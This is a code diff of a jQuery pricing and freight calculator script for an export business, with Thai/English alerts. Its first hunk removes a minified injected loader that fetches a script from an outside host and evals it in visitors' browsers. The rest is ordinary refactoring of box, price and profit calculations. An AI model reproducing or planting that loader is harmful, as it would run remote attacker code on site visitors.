-};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
+}
 
 
 function sudhirComma(x) {
@@ -1354,6 +958,7 @@ function cal_pallet(n)
 
 
 
+
 $(document).on('change', '.unitcount', function() {
 
     if ($('#airport').val() == "" || $('#airline').val() == "") 
@@ -1367,7 +972,8 @@ $(document).on('change', '.unitcount', function() {
 
     var $this = $(this);
     setBlanck($this);
-    const qty = $this.parent().parent().find('td:nth-child(2) input.qty').val();
+    /*var qty = $this.parent().parent().find('td:nth-child(2) input.qty').val();*/
+    var qty;
 
     const itf_id = $this.parent().parent().find('td:nth-child(1) select.select_itf').val();
 
@@ -1378,6 +984,8 @@ $(document).on('change', '.unitcount', function() {
     const count_ean_id = ean_id.length;
 
     const ean_qty = $this.parent().parent().find('td:nth-child(2) input.ean_qty').val();
+    const itfQty = parseFloat($this.parent().parent().find('td:nth-child(2) input.itfQty').val());
+    const number_box = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val());
 
     const net_weight = $this.parent().parent().find('input.net_weight').val();
     const net_weightNew = parseFloat($this.parent().parent().find('input.net_weightNew').val());
@@ -1410,33 +1018,32 @@ $(document).on('change', '.unitcount', function() {
 
     let net_weight2 = 0;
 
-    let box = 0;
 
 
 
-    if (id == 5)
 
+
+  /*  
+
+    if(id==5)
     {
-
-        box = (parseFloat(qty)).toFixed(2);
-
-
-    } else if (id == 2)
-
-    {
-
-        box = (parseFloat(qty) / parseFloat(net_weightNew)).toFixed(2);
-
-
-
-    } else if (id == 1)
-
-    {
-
-        box = (parseFloat(qty) / parseFloat(ean_qty)).toFixed(2);
-
-
+        qty=number_box;
     }
+    else if(id==2)
+    {
+        qty=parseFloat(number_box)*parseFloat(net_weightNew);
+    }
+    else
+    {
+        qty=parseFloat(number_box)*parseFloat(itfQty);
+    }
+    */
+     qty=$this.parent().parent().find('td:nth-child(2) input.qty').val();
+   box =number_box;
+   $this.parent().parent().find('td:nth-child(2) input.qty').val(qty);
+
+//alert("number_box:"+number_box+" net_weightNew:"+net_weightNew+" itfQty:"+itfQty+" qty:"+qty)
+
     $this.parent().parent().find('td:nth-child(4) input.number_box').val(box);
 
     if (box > 0) {
@@ -1464,9 +1071,6 @@ $(document).on('change', '.unitcount', function() {
 
 
     net_weight2 = parseFloat(box) * parseFloat(net_weightNew);
-
-
-    //alert(net_weight2);
 
     $this.parent().parent().find('td:nth-child(2) input.net_weight2').val(parseFloat(net_weight2));
 
@@ -2224,11 +1828,20 @@ $(document).on('change', '.unitcount', function() {
 
 })
 
+function setBlanck($this) {
+    if (!$this.val()) {
+        $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(0);
+        $this.parent().parent().find('td:nth-child(5) input.nw').val(0);
+        $this.parent().parent().find('td:nth-child(5) input.itf_GW').val(0);
+    }
 
-function cal(x = '0') {
+}
 
 
+function cal(x = '0',rowNo='0') {
 
+
+//alert(rowNo)
 
     const time = $('#sorted_table tbody tr').length *8000;
 
@@ -2389,11 +2002,25 @@ function cal(x = '0') {
 
 
                 $.each($('.unitcount'), function()
-
                     {
 
 
                         var $this = $(this);
+
+                        var unitcountID="#"+$this.attr("id");
+                        var qUnit=$this.attr("for");
+                        var nowUnit=$this.val();
+
+                       //  if(rowNo!='0')
+                       //  {
+                       //     if(rowNo!="#"+$this.attr("id"))
+                       //     {
+                       //      return;
+                       //     }
+                       // }
+
+                    
+
 
                         if (!$(this).val()) {
                             ok = 2;
@@ -2475,7 +2102,7 @@ function cal(x = '0') {
 
 
 
-                        console.log("total_pallet_cost:" + total_pallet_cost + " totaNW:" + totaNW + " net_weightNew:" + net_weightNew);
+                       // console.log("total_pallet_cost:" + total_pallet_cost + " totaNW:" + totaNW + " net_weightNew:" + net_weightNew);
 
                         ipallets = parseFloat(ipallets).toFixed(6);
                         ipallets = parseFloat(ipallets).toFixed(5);
@@ -2506,7 +2133,7 @@ function cal(x = '0') {
                             success: function(data) {
 
 
-
+                                    console.log(data);
                                 $("#transport").val(data)
                                 transport = parseInt(data);
 
@@ -2745,51 +2372,78 @@ function cal(x = '0') {
                                         $this.parent().parent().find('td:nth-child(5) input.itf_cal_selling').val(itf_cal_selling);
 
 
+                                  
+                                      
+                                       
+                                      
+                                            //alert("unitcountID:"+unitcountID+" rowNo:"+rowNo);
+                                           fixPrice = parseFloat(itf_cal_selling) / parseFloat(ex_rate); 
 
+                                        
 
-                                        fixPrice = parseFloat(itf_cal_selling) / parseFloat(ex_rate);
+                                            if (itfUnit == '5') {
 
-                                        if (itfUnit == '5') {
+                                                unitPrice = itf_cal_selling;
 
-                                            unitPrice = itf_cal_selling;
+                                            } else if (itfUnit == '2')
 
-                                        } else if (itfUnit == '2')
+                                            {
 
-                                        {
-
-                                            unitPrice = parseFloat(itf_cal_selling) / parseFloat(qty);
-
-
-
-                                            fixPrice = (parseFloat(fixPrice) / parseFloat(net_weightNew));
-
-                                        } else if (itfUnit == '1')
-
-                                        {
-
-                                            unitPrice = parseFloat(itf_cal_selling) / parseFloat(ean_ppITF);
+                                                unitPrice = parseFloat(itf_cal_selling) / parseFloat(qty);
 
 
 
-                                            fixPrice = (parseFloat(fixPrice) / parseFloat(ean_qty));
+                                                fixPrice = (parseFloat(fixPrice) / parseFloat(net_weightNew));
 
-                                        } else
+                                            } else if (itfUnit == '1')
 
-                                        {
+                                            {
 
-                                            fixPrice = 0;
-
-                                            unitPrice = 0;
-
-                                        }
+                                                unitPrice = parseFloat(itf_cal_selling) / parseFloat(ean_ppITF);
 
 
 
+                                                fixPrice = (parseFloat(fixPrice) / parseFloat(ean_qty));
 
-                                        fixPrice = parseFloat(fixPrice).toFixed(2)
-                                        unitPrice = parseFloat(unitPrice).toFixed(2)
+                                            } else
 
-                                        let itf_fx_price1 = (parseFloat(fixPrice) * parseFloat(qty)) / (parseFloat(box));
+                                            {
+
+                                                fixPrice = 0;
+
+                                                unitPrice = 0;
+
+                                            }
+                                             var  isUpdate='1';
+
+                            if(isEdit==1&&unitcountID!=rowNo&&qUnit==nowUnit)  
+                            {
+                                
+                                isUpdate='0';
+                    
+                                unitPrice = parseFloat($this.parent().parent().find('td:nth-child(6) input.unit_price').val()).toFixed(3);;
+                            }
+
+                                fixPrice = parseFloat(fixPrice).toFixed(2)
+                                unitPrice = parseFloat(fixPrice).toFixed(2)
+
+                              if(isEdit==1&&unitcountID!=rowNo&&qUnit==nowUnit)  
+                                {
+                                       var itf_fx_price1 = parseFloat($this.parent().parent().find('td:nth-child(5) input.itf_fx_price').val());; /*by DB */
+                                      
+                                }
+                                else
+                                {
+                                     var itf_fx_price1 = parseFloat($this.parent().parent().find('td:nth-child(5) input.itf_fx_price').val());; /*by DB */
+                                      // var itf_fx_price1 = (parseFloat(fixPrice) * parseFloat(qty)) / (parseFloat(box));
+                                }
+
+                                if(isEdit!=1)
+                                {
+                                    itf_fx_price1 = (parseFloat(fixPrice) * parseFloat(qty)) / (parseFloat(box)); 
+                                }
+
+                                   
 
 
                                         let itf_freight_ = parseFloat(parseFloat(ifreight) * parseFloat(box)).toFixed(5);
@@ -2802,7 +2456,7 @@ function cal(x = '0') {
                                         let profit2 = (parseFloat(itf_fob) + parseFloat(itf_freight_)) - (parseFloat(tcost) * parseFloat(box));
 
 
-                                        $this.parent().parent().find('td:nth-child(5) input.fixPrice').val(parseFloat(fixPrice));
+                                   
 
 
 
@@ -2816,7 +2470,7 @@ function cal(x = '0') {
 
                                         $this.parent().parent().find('td:nth-child(5) input.profit2').val(parseFloat(profit2).toFixed(5));
 
-                                        $this.parent().parent().find('td:nth-child(5) input.itf_fx_price').val(parseFloat(itf_fx_price).toFixed(2));
+                                     
 
 
 
@@ -2854,10 +2508,22 @@ function cal(x = '0') {
 
 
                                         profitP = profitP + "%";
+    
 
+                                        if(isEdit==0||unitcountID==rowNo||qUnit!=nowUnit)
+                                        {
+                                            $this.parent().parent().find('td:nth-child(6) input.unit_price').val(unitPrice);
+                                           
+                                            $this.parent().parent().find('td:nth-child(5) input.itf_fx_price').val(parseFloat(itf_fx_price).toFixed(2)); 
+                                        }
 
+                                        if(qUnit!=nowUnit)
+                                        {
+                                            $this.attr("for",'changed');
+                                        }
 
-                                        $this.parent().parent().find('td:nth-child(6) input.unit_price').val(fixPrice);
+                                         $this.parent().parent().find('td:nth-child(5) input.fixPrice').val(parseFloat(fixPrice));  
+                                        
 
                                         $this.parent().parent().find('td:nth-child(7) input.profit').val(profitP);
 
@@ -2885,9 +2551,13 @@ function cal(x = '0') {
                                         $("#Tbl tbody").append(str);
 
 
-
-                                        /****************/
                                         cntRow++;
+                                        /****************/
+                                        // if(rowNo!='0')
+                                        // {
+                                        //   cntRow=totalRow;  
+                                        // }
+                                        
                                         if (totalRow == cntRow) 
                                         {
 
@@ -3058,6 +2728,7 @@ function cal(x = '0') {
 
 
                 if (x=='0') {
+                    if(rowNo=='0')
                     $("#myBtn").click();
                 }
 
@@ -3080,3 +2751,521 @@ function cal(x = '0') {
 
 
 }
+
+
+
+function recalculation() 
+{
+     $(".unitcount").change(); 
+    if ($('.unit_price').val() == "") 
+    {
+        return false;
+       
+    }
+    else
+    {
+        
+        setTimeout(function() 
+        {
+            cal('2');
+        },2500)
+    }
+
+
+   
+
+}
+
+
+
+function myFunction(th,th1=" ") 
+{
+   // $('#unitcount' + th).prop('selectedIndex', 0);
+
+     setcal(0);
+     if(isEdit==0)
+     {  
+  
+        $(".buttom_vl").text(" ")
+         $("#sorted_table .unit_price").val("")
+
+         if($('#unitcount'+th).val())
+         {
+           setTimeout(function()
+           {
+            $('.unitcount').change();  
+           },200)
+      //$('.unitcount').change();  
+         }
+     
+  }
+  else
+     {
+   
+        //alert("isEdit1:"+isEdit)
+          const $this=$(th1).parent().parent();
+
+          $this.find("td .number_box").val("")
+          $this.find("td .nw").val("")
+          $this.find("td .profit").val("")
+
+                if($('#unitcount'+th).val())
+         {
+           setTimeout(function()
+           {
+            $('.unitcount').change();  
+           },200)
+      //$('.unitcount').change();  
+         }
+       
+     
+     }
+
+
+   //alert($('#unitcount'+th).val())
+    
+
+
+    
+}
+
+
+$(document).on('change', '.unit_price', function() {
+
+    var $this = $(this).parent();
+
+    const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
+    const box = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val());
+
+    const tcost = parseFloat($this.parent().parent().find('td:nth-child(5) input.itotal_cost').val());
+    // alert(qty)
+
+
+    const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_cost').val());
+
+    const itf_freight_rate = parseFloat($this.parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
+
+    const unit_price = parseFloat($(this).val());
+
+    var fixPrice = unit_price;
+
+    const ex_rate = parseFloat($('#ex_rate').val())
+
+    let rebate = parseFloat($('#rebate').val());
+
+    const profit = ((unit_price * ex_rate * qty) - total_itf_cost) / total_itf_cost * 100;
+
+    let markup_rate = parseFloat($('#markup_rate').val())
+
+    var markup_rateCal = ((0.0198 * (markup_rate * markup_rate)) + (0.7901 * markup_rate) + 1.34) / 100;
+
+    $("#markup_rateCal").val(markup_rateCal.toFixed(4));
+
+
+
+
+    let fob = 0;
+
+    let total_all_cost = 0;
+
+    let profit_before_rebate = 0;
+
+    let profit_after_rebate = 0;
+
+    var itf_fob = 0;
+    var profitx = 0;
+    var itf_freight = 0;
+    var itf_fx_price1 = 0;
+    var itf_fx_price = 0;
+    setTimeout(function() {
+
+
+        $.each($('.unit_price'), function() {
+
+            var $this = $(this);
+            const itf_cal_selling = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_cal_selling').val());;
+
+
+            const unit_price = parseFloat($this.val());
+
+            const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
+            const itf_freight_rate = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
+            const itotal_cost = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itotal_cost').val());
+            const number_box = parseFloat($this.parent().parent().parent().find('td:nth-child(4) input.number_box').val());
+
+            const itf_freight1 = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight').val());
+
+            const ex_rate = parseFloat($('#ex_rate').val())
+
+            const itf_fob1 = parseFloat(parseFloat((parseFloat(unit_price) * parseFloat(qty) * parseFloat(ex_rate)) - parseFloat(itf_freight_rate))).toFixed(5);
+            itf_fob = parseFloat(itf_fob) + parseFloat(itf_fob1);
+
+            const profit = (parseFloat(itf_fob1) + parseFloat(itf_freight_rate)) - (parseFloat(itotal_cost) * parseFloat(number_box));
+
+            profitx = parseFloat(profitx) + parseFloat(profit);
+
+
+            itf_freight = parseFloat(itf_freight) + parseFloat(itf_freight1);
+
+            itf_fx_price1 = (parseFloat(unit_price) * parseFloat(qty)) / (parseFloat(number_box));
+
+            itf_fx_price = parseFloat(itf_fx_price1).toFixed(2);
+
+
+            profitP = ((parseFloat(itf_fx_price) * parseFloat(ex_rate)) * (1 - parseFloat(rebate) / 100) - parseFloat(itotal_cost)) / parseFloat(itf_cal_selling);
+
+
+            profitP = parseFloat(profitP * 100).toFixed(2);
+
+            $this.parent().parent().parent().find('td:nth-child(7) input.profit').val(profitP + "%");
+
+
+        })
+
+
+
+        $('#span_fob').text(sudhirComma(itf_fob.toFixed(5)));
+
+        $('#total_fob').val(itf_fob.toFixed(5));
+
+
+
+        $('#span_pro_before_rebate').text(sudhirComma(profitx.toFixed(2)));
+        $('#total_pro_before_rebate').val(profitx.toFixed(2));
+
+
+
+    }, 1000)
+
+
+
+    setTimeout(function() {
+
+        if ($('#total_pro_before_rebate').val() != '') {
+
+            const rebate = parseFloat($('#rebate').val());
+
+            if ($('#rebate').val() != '') {
+
+                var span_fcnft = parseFloat(itf_fob) + parseFloat(itf_freight);
+                $("#span_fcnft").text(sudhirComma(span_fcnft.toFixed(2)));
+                $("#total_cnf").val(sudhirComma(span_fcnft.toFixed(2)));
+
+                let span_pro_after_rebate = parseFloat(profitx) - (parseFloat(span_fcnft) * parseFloat(rebate) / 100);
+
+
+
+
+                $('#span_pro_after_rebate').text(sudhirComma(span_pro_after_rebate.toFixed(2)));
+
+                $('#total_pro_after_rebate').val(span_pro_after_rebate.toFixed(2));
+
+
+                var span_pro_percent = parseFloat(span_pro_after_rebate) / parseFloat(span_fcnft) * 100;
+                $("#span_pro_percent").text(sudhirComma(span_pro_percent.toFixed(2)));
+
+
+
+                $('#total_pro_percent').val(sudhirComma(span_pro_percent.toFixed(2)));
+
+            } else {
+
+                alert('กรุณากรอก Rebate แล้วกดคำนวณอีกครั้ง / Please enter Rebate then press calculate again')
+
+            }
+
+        }
+
+    }, 1200)
+
+})
+
+
+
+function getPalatass()
+
+{
+
+    const time = $('#sorted_table tbody tr').length * 1000;
+
+    //loading(time);
+
+    const select_clearance = $('#select_clearance').val();
+
+    let total_nw = $('#total_nw').val();
+
+    let total_gw = $('#total_gw').val();
+
+    let total_cbm = $('#total_cbm').val();
+
+    let palletized = $('#palletized').val();
+
+    let fob = 0;
+
+    let total_all_cost = 0;
+
+    let profit_before_rebate = 0;
+
+    let profit_after_rebate = 0;
+
+
+
+    if (select_clearance != '')
+
+    {
+
+        const clearance = parseFloat($('#clearance').val());
+
+        const clearance_price = clearance / total_nw;
+
+        $('#clearance_price').val(clearance_price);
+
+        $.each($('input.itf_clearance_price'), function() {
+
+            const nw = $(this).parent().find('input.nw').val();
+
+            const itf_clearance_price = parseFloat($('#clearance_price').val()) * parseFloat(nw);
+
+            $(this).val(itf_clearance_price.toFixed(4))
+
+        })
+
+
+
+        $.ajax({
+
+            url: FULLURL + '/compareTransport',
+
+            method: 'get',
+
+            data: {
+                total_nw: total_nw,
+                total_cbm: total_cbm,
+                select_clearance: select_clearance,
+                pallet: palletized
+            },
+
+            success: function(data) {
+
+
+
+                $('#transport').val(data);
+
+                const transport = parseFloat($('#transport').val());
+
+                const transport_price = transport / total_nw;
+
+                $('#transport_price').val(transport_price);
+
+                $.each($('input.itf_transport_price'), function() {
+
+                    const itf_transport_price = parseFloat($('#transport_price').val()) * parseFloat($(this).parent().find('input.nw').val());
+
+                    $(this).val(itf_transport_price.toFixed(4))
+
+
+
+                })
+
+            }
+
+        })
+
+    }
+
+}
+
+
+$(document).ready(function()
+{
+    var unitcount= $('.unitcount').val();
+    if(unitcount)
+    {
+     $('.unitcount').change();
+    }
+})
+
+$(document).on('click', '.update-row', function() 
+{
+    cal();
+    
+})
+
+$(document).on('click','.calculate-row',function(){
+
+    cal('0',"#unitcount"+$(this).val());
+})
+
+
+// $(document).on('click','.calculate-row111',function(){
+//     const time = $('#sorted_table tbody tr').length*1000;
+//     loading(time);
+//     const select_clearance = $('#select_clearance').val();
+//     var $this = $(this);
+
+//     let total_nw = $('#total_nw').val();
+//     let total_gw = $('#total_gw').val();
+//     let total_cbm = $('#total_cbm').val();
+//     let palletized = $('#palletized').val();
+
+//     // alert("total_nw:"+total_nw+" total_gw:"+total_gw+" total_cbm:"+total_cbm+" palletized:"+palletized+" select_clearance:"+select_clearance)
+//     let fob = 0;
+//     let total_all_cost = 0;
+//     let profit_before_rebate = 0;
+//     let profit_after_rebate = 0;
+
+//     if(select_clearance != ''){
+//         const clearance = parseFloat($('#clearance').val());
+//         const clearance_price = clearance/total_nw;
+//         $('#clearance_price').val(clearance_price);
+//         $.each($('input.itf_clearance_price'),function(){
+//         const nw = $(this).parent().find('input.nw').val();
+//         const itf_clearance_price = parseFloat($('#clearance_price').val())*parseFloat(nw);
+//         $(this).val(itf_clearance_price.toFixed(4))
+//         })
+
+//         $.ajax({
+//             url: FULLURL+'/compareTransport',
+//             method:'get',
+//             data: {total_nw:total_nw,total_cbm:total_cbm,select_clearance:select_clearance,pallet:palletized},
+//             success:function(data){
+//                 $('#transport').val(data);
+//                 const transport = parseFloat($('#transport').val());
+//                 const transport_price = transport/total_nw;
+//                 $('#transport_price').val(transport_price);
+//                 $.each($('input.itf_transport_price'),function(){
+//                     const itf_transport_price = parseFloat($('#transport_price').val())*parseFloat($(this).parent().find('input.nw').val());
+//                     $(this).val(itf_transport_price.toFixed(4))
+//                     // $(this).val(transport.toFixed(4))
+//                 })
+//             }
+//         })
+//     }else{
+//         alert('กรุณาเลือก Clearance แล้วกดคำนวณอีกครั้ง / Please select Clearance then press calculate again')
+//     }
+
+//     if($('#airport').val() != "" && $('#airline').val() != ""){
+//             $.ajax({
+//                 url: FULLURL+'/getRate',
+//                 method:'get',
+//                 data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
+//                 success:function(data){
+//                     $.each($('.itf_freight_rate'),function(){
+//                         var $this = $(this);
+//                         const gw = $this.parent().find('input.gw_weight').val();
+//                         const itf_freight_rate = parseFloat(data.nego_rate)*parseFloat(gw);
+//                         $this.val(itf_freight_rate.toFixed(4));
+
+//                         const total_freight_rate = parseFloat(data.nego_rate)*parseFloat(total_gw);
+//                         $('#span_freight').text(total_freight_rate.toFixed(4));
+//                         $('#total_freight').val(total_freight_rate.toFixed(4));
+//                     })
+//                 }
+//             })
+//     }else{
+//         alert('กรุณาเลือก Airport และ Airline แล้วกดคำนวณอีกครั้ง / Please select Airport and Airline then press calculate again');
+//     }
+
+//     setTimeout(function(){
+//         $.each($('.total_itf_cost'),function(){
+//             var $this = $(this);
+//             const pallet_price = $this.parent().find('input.itf_pallet_price').val();
+//             const clearance_price = $this.parent().find('input.itf_clearance_price').val();
+//             const transport_price = $this.parent().find('input.itf_transport_price').val();
+//             const cost_price = $this.parent().find('input.itf_cost_price').val();
+//             const freight_rate = $this.parent().find('input.itf_freight_rate').val();
+//             if(pallet_price != "" && clearance_price != "" && transport_price != "" && cost_price != "" && freight_rate != ""){
+//                 const total_itf_cost = parseFloat(pallet_price)+parseFloat(clearance_price)+parseFloat(transport_price)+parseFloat(cost_price)+parseFloat(freight_rate);
+//                 $this.val(total_itf_cost.toFixed(4));
+//             }
+//         })
+//     },700)
+//     setTimeout(function(){
+//         if($('.total_itf_cost').val() != ''){
+//             // $.each($('.unit_price'),function(){
+//             //     var $this = $(this);
+//                 const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
+//                 const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
+//                 //const unit_price = total_itf_cost / qty;
+//                  const unit_price = parseFloat($this.parent().parent().find('td:nth-child(6) input.unit_price').val());
+//                 const markup_rate = parseFloat($('#markup_rate').val())
+//                 const ex_rate = parseFloat($('#ex_rate').val())
+//                 if(markup_rate >= 0 && ex_rate >= 0){
+//                     const cal = (1+((0.0198*(Math.pow(markup_rate,2))+(0.7901*markup_rate)+1.26)/100))*unit_price/ex_rate;
+//                    // $this.parent().parent().find('input.unit_price').val(cal.toFixed(2));
+//                 }else{
+//                     alert('กรุณาเลือก Currency และ EX Rate และ Markup Rate แล้วกดคำนวณอีกครั้ง / Please select Currency and EX Rate and Markup Rate then press calculate again');
+//                 }
+                
+//             // })
+//         }
+//     },900)
+//     setTimeout(function(){
+//         if($('.unit_price').val() != ''){
+//             // $.each($('.profit'),function(){
+//             //     var $this = $(this);
+//                 const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
+//                 const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
+//                 const itf_freight_rate = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
+//                 const unit_price = parseFloat($this.parent().parent().find('td:nth-child(6) input.unit_price').val());
+//                 const ex_rate = parseFloat($('#ex_rate').val())
+//                 const profit = ((unit_price*ex_rate*qty)-total_itf_cost)/total_itf_cost*100;
+
+
+                
+//                 $this.parent().parent().find('input.profit').val(profit.toFixed(2));
+//                 const fob_th = (unit_price*ex_rate*qty)-itf_freight_rate;
+//                 $this.parent().parent().find('input.fob').val(fob_th.toFixed(4));
+//             // })
+//         }
+//     },1100)
+
+//     setTimeout(function(){
+//         if($('.unit_price').val() != ''){
+//             $.each($('.unit_price'),function(){
+//                 var $this = $(this);
+//                 const unit_price = parseFloat($this.val());
+//                 const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
+//                 const ex_rate = parseFloat($('#ex_rate').val())
+//                 fob += unit_price*ex_rate*qty;
+//             })
+//             const total_fob = fob-$('#total_freight').val();
+//             $('#span_fob').text(total_fob.toFixed(2));
+//             $('#total_fob').val(total_fob.toFixed(2));
+//             $.each($('.total_itf_cost'),function(){
+//                 var $this = $(this);
+//                 const total_itf_cost = parseFloat($this.val());
+//                 total_all_cost += total_itf_cost;
+//             })
+//             profit_before_rebate = fob-total_all_cost;
+//             $('#span_pro_before_rebate').text(profit_before_rebate.toFixed(2));
+//             $('#total_pro_before_rebate').val(profit_before_rebate.toFixed(2));
+//         }
+//     },1300)
+
+//     setTimeout(function(){
+//         if($('#total_pro_before_rebate').val() != ''){
+//             const rebate = parseFloat($('#rebate').val());
+//             if($('#rebate').val() != ''){
+//                 profit_after_rebate = profit_before_rebate-(rebate/100*fob);
+//                 $('#span_pro_after_rebate').text(profit_after_rebate.toFixed(2));
+//                 $('#total_pro_after_rebate').val(profit_after_rebate.toFixed(2));
+//                 const profit_percent = (profit_after_rebate/total_all_cost)*100;
+//                 $('#span_pro_percent').text(profit_percent.toFixed(2));
+//                 $('#total_pro_percent').val(profit_percent.toFixed(2));
+//             }else{
+//                 alert('กรุณากรอก Rebate แล้วกดคำนวณอีกครั้ง / Please enter Rebate then press calculate again')
+//             }
+//         }
+//         $.ajax({
+//             url: FULLURL+'/getRate',
+//             method:'get',
+//             data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
+//             success:function(data){
+//                 if(data.min > total_gw){
+//                     alert("min GW requirment not met. please increase order to min GW of "+total_gw+' to more than '+data.min);
+//                 }
+//             }
+//         })
+//     },1500)
+// })
